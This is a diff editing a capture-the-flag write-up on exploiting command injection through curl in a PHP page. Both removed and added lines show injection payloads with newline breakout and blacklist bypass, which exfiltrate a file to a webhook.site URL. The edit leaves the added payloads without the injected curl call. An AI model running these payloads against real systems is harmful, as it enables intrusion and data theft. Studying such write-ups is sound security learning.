@@ -72,24 +72,16 @@ The file was accessible, but output handling was an issue.
 We tried:
 
 ```
-http://104.214.185.119/index.php/%0acurl -X POST --data-binary "$(cat hopes_and_dreams)" https://webhook.site/...
+http://104.214.185.119/index.php/ -X POST -d "$(cat hopes_and_dreams)" https://webhook.site/...
 ```
 
 Problem: The shell treated `$(cat hopes_and_dreams)` as a literal string instead of executing it due to $() are being blacklisted.
-
-We also tried:
-
-```
-http://104.214.185.119/index.php/%0acurl -s http://104.214.185.119/hopes_and_dreams > /tmp/output.txt
-```
-
-Problem: > is blacklisted, preventing redirection.
 
 ✅ The Working Exploit
 The key was using file input with curl:
 
 ```
-http://104.214.185.119/index.php/%0acurl -X POST --data-binary @hopes_and_dreams https://webhook.site/...
+http://104.214.185.119/index.php/ -X POST -d @hopes_and_dreams https://webhook.site/...
 ```
 
 Why did this work?
@@ -105,8 +97,6 @@ The @<filename> trick in curl allows file exfiltration without needing command s
 Final Summary
 Identified command injection via curl in PHP.
 
-Used %0a (newline) to break out of the intended command.
-
 Confirmed file existence (cat hopes_and_dreams).
 
 Bypassed output handling restrictions with @<filename> in curl.
@@ -115,10 +105,10 @@ Successfully exfiltrated the file contents via a webhook.
 
 ## Final Payload
 ```
-http://104.214.185.119/index.php/%0acurl -X POST --data-binary @hopes_and_dreams https://webhook.site/8001c163-fff8-48f1-94d9-787c5b4a24d6
+http://104.214.185.119/index.php/ -X POST -d @hopes_and_dreams https://webhook.site/8001c163-fff8-48f1-94d9-787c5b4a24d6
 ```
 
-![img](Screenshot%20(125).png)
+![img](flag.png)
 
 ## 🏳️Flag
 >umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}
